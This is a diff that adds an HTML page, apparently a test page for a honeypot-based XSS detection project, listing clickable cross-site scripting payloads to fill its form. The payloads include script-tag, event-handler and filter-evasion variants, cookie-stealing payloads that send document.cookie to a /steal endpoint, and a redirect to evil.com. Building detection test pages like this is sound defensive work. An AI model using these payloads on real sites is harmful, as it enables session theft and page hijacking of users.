@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Test Page - Honey Trap AI</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], textarea {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .examples {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .example {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .example:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .back-btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button onclick="window.location.href='/'" class="back-btn">← Back to Home</button>
+        
+        <h1>🛡️ XSS Attack Test Page</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Warning:</strong> This page is designed to test XSS attack detection. 
+            Any malicious scripts entered here will be detected and you'll be redirected to the honeypot!
+        </div>
+
+        <form id="xssForm" action="/xss-test" method="POST">
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="text" id="email" name="email" placeholder="Enter email or XSS payload..." required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="text" id="password" name="password" placeholder="Enter password or XSS payload..." required>
+            </div>
+            
+            <div class="form-group">
+                <label for="comment">Comment (XSS Test):</label>
+                <textarea id="comment" name="comment" rows="4" placeholder="Try entering XSS payloads here..."></textarea>
+            </div>
+            
+            <button type="submit">Submit (Test XSS Detection)</button>
+        </form>
+
+        <div class="examples">
+            <h3>🎯 Try These XSS Payloads:</h3>
+            <p>Click on any example to auto-fill the email field:</p>
+            
+            <h4>Basic Script Tags:</h4>
+            <div class="example" onclick="fillXSS('<script>alert(\"XSS Attack!\")</script>')">
+                &lt;script&gt;alert("XSS Attack!")&lt;/script&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<script>alert(String.fromCharCode(88,83,83))</script>')">
+                &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+            </div>
+            
+            <h4>Event Handlers:</h4>
+            <div class="example" onclick="fillXSS('<img src=x onerror=alert(\"XSS\")>')">
+                &lt;img src=x onerror=alert("XSS")&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<svg onload=alert(\"XSS\")>')">
+                &lt;svg onload=alert("XSS")&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<body onload=alert(\"XSS\")>')">
+                &lt;body onload=alert("XSS")&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<input onfocus=alert(\"XSS\") autofocus>')">
+                &lt;input onfocus=alert("XSS") autofocus&gt;
+            </div>
+            
+            <h4>JavaScript URLs:</h4>
+            <div class="example" onclick="fillXSS('javascript:alert(\"XSS\")')">
+                javascript:alert("XSS")
+            </div>
+            
+            <div class="example" onclick="fillXSS('javascript:void(alert(\"XSS\"))')">
+                javascript:void(alert("XSS"))
+            </div>
+            
+            <h4>Advanced Techniques:</h4>
+            <div class="example" onclick="fillXSS('"><script>alert(\"XSS\")</script>')">
+                "&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<iframe src=javascript:alert(\"XSS\")>')">
+                &lt;iframe src=javascript:alert("XSS")&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<object data=javascript:alert(\"XSS\")>')">
+                &lt;object data=javascript:alert("XSS")&gt;
+            </div>
+            
+            <h4>Cookie Stealing:</h4>
+            <div class="example" onclick="fillXSS('<script>fetch(\"/steal?cookie=\"+document.cookie)</script>')">
+                &lt;script&gt;fetch("/steal?cookie="+document.cookie)&lt;/script&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<img src=x onerror=this.src=\"/steal?cookie=\"+document.cookie>')">
+                &lt;img src=x onerror=this.src="/steal?cookie="+document.cookie&gt;
+            </div>
+            
+            <h4>DOM Manipulation:</h4>
+            <div class="example" onclick="fillXSS('<script>document.body.innerHTML=\'<h1>Hacked!</h1>\'</script>')">
+                &lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'&lt;/script&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<script>window.location=\'http://evil.com\'</script>')">
+                &lt;script&gt;window.location='http://evil.com'&lt;/script&gt;
+            </div>
+            
+            <h4>Filter Evasion:</h4>
+            <div class="example" onclick="fillXSS('<ScRiPt>alert(\"XSS\")</ScRiPt>')">
+                &lt;ScRiPt&gt;alert("XSS")&lt;/ScRiPt&gt;
+            </div>
+            
+            <div class="example" onclick="fillXSS('<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>')">
+                &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))&lt;/script&gt;
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function fillXSS(payload) {
+            document.getElementById('email').value = payload;
+            document.getElementById('password').value = 'test123';
+        }
+        
+        // Also test URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const xssParam = urlParams.get('xss');
+        if (xssParam) {
+            document.getElementById('email').value = xssParam;
+        }
+    </script>
+</body>
+</html>
